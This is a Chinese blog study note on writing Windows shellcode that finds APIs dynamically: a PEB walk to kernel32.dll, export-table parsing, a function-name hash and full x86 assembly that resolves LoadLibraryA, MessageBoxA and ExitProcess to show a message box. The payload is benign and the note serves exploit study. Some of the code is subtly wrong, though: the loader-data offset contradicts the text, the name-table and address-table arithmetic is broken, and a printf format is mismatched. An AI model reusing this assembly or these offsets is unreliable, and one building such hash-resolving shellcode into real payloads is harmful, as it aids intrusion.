---
title: 漏洞学习笔记-003-API动态加载
description: ShellCode的API动态定位
date: 2020-10-19 20:20:00+0800
categories:
    - Exploit
tags:
    - Windows
    - Exploit
---

> [点击此处下载本文附可执行程序，shellcode文件](./exploit-study-03.zip)

本文来源：[Moeomu的博客](/zh-cn/posts/漏洞学习笔记-003-api动态加载/)

## 通过TEB定位API地址

### 定位Kernel32.dll

- 程序加载时，用户态下`[FS:0]`寄存器中存放TEB地址
- TEB偏移0x30的位置`[TEB + 0x30]`存放PEB的地址
- PEB偏移0xC的位置`[PEB + 0xC]`存放PEB_LDR_DATA
- 关于PEB_LDR_DATA结构，微软官方的说明[点此](https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb_ldr_data)，C语言表示如下

```CPP
typedef struct _PEB_LDR_DATA {
  BYTE       Reserved1[8];
  PVOID      Reserved2[3];
  LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;
```

> 以下是我的调试结果

```cpp
typedef struct _PEB_LDR_DATA {
  INT        Length;
  UCHAR      Initialized;
  PVOID      SsHandle;
  LIST_ENTRY InLoadOrderModuleList;
  LIST_ENTRY InMemoryOrderModuleList;
  LIST_ENTRY InInitializationOrderModuleList;
  PVOID      EntryInProgress;
  UCHAR      ShutdownInProgress;
  PVOID      ShutdownThreadId;
} PEB_LDR_DATA, *PPEB_LDR_DATA;
```

- 我们需要读取InInitializationOrderModuleList(初始化加载模块列表)来取得Kernel32.dll的地址，而此列表是LIST_ENTRY结构，此结构的微软官方说明如下

```CPP
typedef struct _LIST_ENTRY {
   struct _LIST_ENTRY *Flink;
   struct _LIST_ENTRY *Blink;
} LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;
```

> 我的调试结果：

```CPP
typedef struct LinkNode
{
    _LIST_ENTRY Flink;
    _LIST_ENTRY Blink;
    PVOID DllAddress;
}
```

- 由此可见，在链表节点的`+0xC`处存在DllAddress，而任何程序前三个节点均为`Ntdll -> KernelBa -> Kernel32`

### 定位API地址(逆向Kernel32.dll)

> 上一小节获得了Kernel32的加载基址，此小节由此获取`LoadLibrary`和`GetProcAddress`的地址用于获取其它函数地址

- 偏移`0x3C`是PEHeader的入口，标志字为`0x5045`，文字为`PE`
- 再加上`0x78`的偏移是导出函数地址表的地址(Export Directory RVA)，此时的偏移为`0x168`，值为`0x262C`
- 再加上`0x4`的偏移是导出函数地址表的大小(Export Directory Size)，值是`0x6CFD`
- 在磁盘上时，节大小的最小单位是`0x200`，但加载到内存中，节大小的最小单位变为`0x1000`，而PE文件头在文件中占据的大小是`0x400`，但是映射到内存中将占据`0x1000`的大小，大小差值为`0xC00`，所以`0x262C`应当减去`0xC00`，得到导出目录表`Export Directory`的地址`0x1A2C`
- 在导出目录表的`0x28`偏移处是第一个导出函数的地址，序列号为`0`
- 在导出目录表的`0x67C`偏移处是函数`GetProcAddress`的地址，序列号为`198`
- 在导出目录表的`0x340`偏移处是函数`LoadLibraryA`的地址，序列号为`244`
- 至此，两个重要函数的地址找到了

---

## 调试ShellCode(ExpStd0301)

```C
char shellcode[] = "\x10\x10";

void main()
{
  __asm
  {
    lea eax, shellcode
    push eax
    ret
  }
}
```

---

## 动态API加载ShellCode

### 理论分析

- 需要的API函数
  - MessageBoxA(User32.dll)
  - ExitProcess(Kernel32.dll)
  - LoadLibraryA(Kernel32.dll)
- 一个难题：如何在需要ShellCode尽可能短的情况下(不存在函数名称)找到API的地址

### 函数名的HASH算法

#### 理论

- 需要引入额外的HASH算法
- 计算的结果称为DIGEST(摘要)
- 对搜索到的函数名进行HASH

#### 算法(ExpStd0302)

```C
#include <stdio.h>
#include <windows.h>

DWORD GetHash(char *fun_name)
{
  DWORD digest = 0;
  while(*fun_name)
  {
    digest = ((digest << 25) | (digest >> 7));
    digest += *fun_name;
    fun_name++;
  }
  return digest;
}

void main()
{
  DWORD hash;
  hash = GetHash("MessageBoxA");
  printf("Hash is %s", hash);
}
```

---

## 最终ShellCode(ExpStd0303)

```x86asm
int main()
{
  _asm{
    ;flag
    nop
    nop
    nop
    nop
    nop

    cld                        ;clear flag DF

    ;store hash
    push 0x1e380a6a            ;hash of MessageBoxA
    push 0x4fd18963            ;hash of ExitProcess
    push 0x0c917432            ;hash of LoadLibraryA
    mov esi, esp               ;esi = addr of first func hash
    lea edi, [esi-0xc]         ;edi = addr to start writing func

    ;make some stack space
    xor ebx, ebx
    mov bh, 0x04
    sub esp, ebx

    ;push a pointer to "user32" onto stack
    mov bx, 0x3233             ;rest of ebx is null
    push ebx
    push 0x72657375
    push esp
    xor edx, edx

    ;find base addr of kernel32.dll
    mov ebx, fs:[edx + 0x30]   ;ebx = PEB address
    mov ecx, [ebx + 0x1c]      ;ecx = loader data pointer
    mov ecx, [ecx + 0x1c]      ;ecx = first entry in Initialization order list
    mov ecx, [ecx]             ;ecx = second entry
    mov ebp, [ecx + 0x08]      ;ebp = base address of kernel32.dll

  find_lib_functions:
    lodsd                      ;load next hash into al and increment esi
    cmp eax, 0x1e380a6a        ;hash of MessageBoxA - trigger and LoadLibrary("user32")
    jne find_functions
    xchg eax, ebp              ;save current hash
    call [edi - 0x8]           ;LoadLibraryA
    xchg eax, ebp              ;restore current hash and update ebp with base address of user32.dll
  
  find_functions:
    pushad                     ;preserve registers
    mov eax, [ebp + 0x3c]      ;eax = start of PEheader
    mov ecx, [ebp + eax + 0x78];ecx = relative offset of export table
    add ecx, ebp               ;ecx = absolute addr of export table
    mov ebx, [ecx + 0x20]      ;ebx = relative offset of names
    add ebx, ebp               ;ebx = absolute addr of names table
    xor edi, edi               ;edi will count through the functions
  
  next_function_loop:
    inc edi                    ;inc function counter
    mov esi, [ebp + edi * 4]   ;esi = relative offset of current function name
    add esi, ebp               ;esi = absolute addr of current function name
    cdq                        ;dl will hold hash (we know eax is small)
  
  hash_loop:
    movsx eax, byte ptr[esi]
    cmp al, ah
    jz compare_hash
    ror edx, 7
    add edx, eax
    inc esi
    jmp hash_loop

  compare_hash:
    cmp edx, [esp + 0x1c]      ;compare to the requested hash(saved on stack from pushad)
    jnz next_function_loop
    mov ebx, [ecx + 0x24]      ;ebx = relative offset of ordinals table
    add ebx, ebp               ;ebx = absolute addr of ordinals table
    mov di, [ebx + 2 * edi]    ;di = ordinal number of matched function
    mov ebx, [ecx + 0x1c]      ;ebx = relative offset of address table
    mov ebx, ebp               ;ebx = absolute addr of address table
    add ebp, [ebx + 4 * edi]  ;add to ebp(base addr of module) the relative offset of matched function
    xchg eax, ebp              ;move func addr into eax
    pop edi                    ;edi is last onto stack in pushad
    stosd                      ;write function addr to [edi] and increment edi
    push edi
    popad                      ;restore registers and loop until we reach end of alst hash
    cmp eax, 0x1e380a6a
    jne find_lib_functions
  
  function_call:
    xor ebx, ebx
    push ebx                   ;cut string
    push 0x74736577
    push 0x6c696166            ;push failwest
    mov eax, esp               ;load address of failwest
    push ebx
    push eax
    push eax
    push ebx
    call [edi - 0x4]           ;call MessageBoxA
    push ebx
    call[edi - 0x8]            ;call ExitProcess


    ;flag
    nop
    nop
    nop
    nop
  }
}
```
